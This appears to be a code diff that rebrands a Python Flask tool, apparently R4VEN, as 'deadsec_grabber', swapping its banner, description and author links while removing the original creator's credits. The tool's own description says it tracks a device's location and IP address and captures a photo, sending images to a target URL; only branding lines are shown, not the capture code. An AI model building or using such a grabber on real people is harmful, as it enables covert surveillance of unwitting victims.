@@ -8,7 +8,7 @@ import requests
 import argparse
 
 parser = argparse.ArgumentParser(
-    description="R4VEN - Track device location, and IP address, and capture a photo with device details.",
+    description="deadsec_grabber by DeadSec Hacker - Track device location, and IP address, and capture a photo with device details.",
     usage=f"{sys.argv[0]} [-t target] [-p port]"
 )
 parser.add_argument("-t", "--target", nargs="?", help="the target url to send the captured images to", default="http://localhost:8000/image")
@@ -27,11 +27,8 @@ HTML_FILE_NAME = "index.html"
 app = Flask(__name__)
 
 
-twitter_url = 'https://spyboy.in/twitter'
-discord = 'https://spyboy.in/Discord'
-website = 'https://spyboy.in/'
-blog = 'https://spyboy.blog/'
-github = 'https://github.com/spyboy-productions/r4ven'
+instagram_url = 'https://www.instagram.com/deadsechacker_?igsh=MWNrNXBwMDQyaThxMQ=='
+github = 'https://github.com/FullPenetrationTesting'
 
 VERSION = '1.1.3'
 
@@ -45,12 +42,11 @@ else:
     R = G = C = W = Y = ''
 
 banner = r'''                                                    
-__________    _________   _______________ _______   
-\______   \  /  |  \   \ /   /\_   _____/ \      \  
- |       _/ /   |  |\   Y   /  |    __)_  /   |   \ 
- |    |   \/    ^   /\     /   |        \/    |    \
- |____|_  /\____   |  \___/   /_______  /\____|__  /
-        \/      |__|                  \/         \/ 
+     _             _                            _    _             
+  __| |___ __ _ __| |___ ___ __   __ _ _ _ __ _| |__| |__  ___ _ _ 
+ / _` / -_) _` / _` (_-</ -_) _| / _` | '_/ _` | '_ \ '_ \/ -_) '_|
+ \__,_\___\__,_\__,_/__/\___\__| \__, |_| \__,_|_.__/_.__/\___|_|  
+                                 |___/                            
 Track device location, and IP address, and capture a photo with device details.
 
 '''
@@ -118,14 +114,8 @@ def print_banners():
     """
     print(f'{R}{banner}{W}')
     print(f'{G}[+] {C}Version      : {W}{VERSION}')
-    print(f'{G}[+] {C}Created By   : {W}Spyboy')
-    print(f'{G} ╰➤ {C}Twitter      : {W}{twitter_url}')
-    print(f'{G} ╰➤ {C}Discord      : {W}{discord}')
-    print(f'{G} ╰➤ {C}Website      : {W}{website}')
-    print(f'{G} ╰➤ {C}Blog         : {W}{blog}')
-    print(f'{G} ╰➤ {C}Github       : {W}{github}\n')
-
-
+    print(f'{G}[+] {C}Created By   : {W}DeadsecHacker')
+    
 def print_port_forwarding_instructions():
     """
     prints the port forwarding instruction
